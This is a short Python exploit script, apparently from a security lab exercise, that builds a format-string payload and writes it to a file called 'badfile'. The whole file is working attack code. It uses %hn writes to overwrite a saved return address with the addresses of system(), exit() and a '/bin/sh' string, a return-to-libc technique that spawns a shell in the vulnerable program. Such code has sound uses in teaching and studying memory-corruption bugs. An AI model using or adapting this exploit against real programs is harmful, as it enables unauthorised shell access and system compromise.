#!/usr/bin/python3
import sys

N = 200

# Put the address of return address at the beginning
addr = 0xffffd078 + 4
payload  = (addr + 10).to_bytes(4,byteorder='little')  # high 2 bytes of /bin/sh string address
payload += ("@@@@").encode('latin-1')           
payload += (addr + 8).to_bytes(4,byteorder='little')  # low 2 bytes of /bin/sh string address
payload += ("@@@@").encode('latin-1')
payload += (addr + 6).to_bytes(4,byteorder='little')  # high 2 bytes of exit address
payload += ("@@@@").encode('latin-1')
payload += (addr + 4).to_bytes(4,byteorder='little')  # low 2 bytes of exit address
payload += ("@@@@").encode('latin-1')
payload += (addr + 2).to_bytes(4,byteorder='little')  # high 2 bytes of system address
payload += ("@@@@").encode('latin-1')
payload += (addr).to_bytes(4,byteorder='little')      # low 2 bytes of system address

sh_str_addr = 0xf7f49b62
exit_addr   = 0xf7df1680
system_addr = 0xf7dfed00

# Construct the format string
offset1 = 0xf7f4  - len(payload)
offset2 = 0x19b62 - 0xf7f4
offset3 = 0x1f7df - 0x19b62
offset4 = 0x21680 - 0x1f7df
offset5 = 0x2f7df - 0x21680
offset6 = 0x3ed00 - 0x2f7df
s = "%." + str(offset1) + "x" + "%17$hn" + \
    "%." + str(offset2) + "x" + "%19$hn" + \
    "%." + str(offset3) + "x" + "%21$hn" + \
    "%." + str(offset4) + "x" + "%23$hn" + \
    "%." + str(offset5) + "x" + "%25$hn" + \
    "%." + str(offset6) + "x" + "%27$hn" + "\n"
payload += (s).encode('latin-1')

payload += bytearray(0x90 for _ in range(N - len(payload)))

# Write the payload to badfile
with open("badfile", "wb") as f:
    f.write(payload)
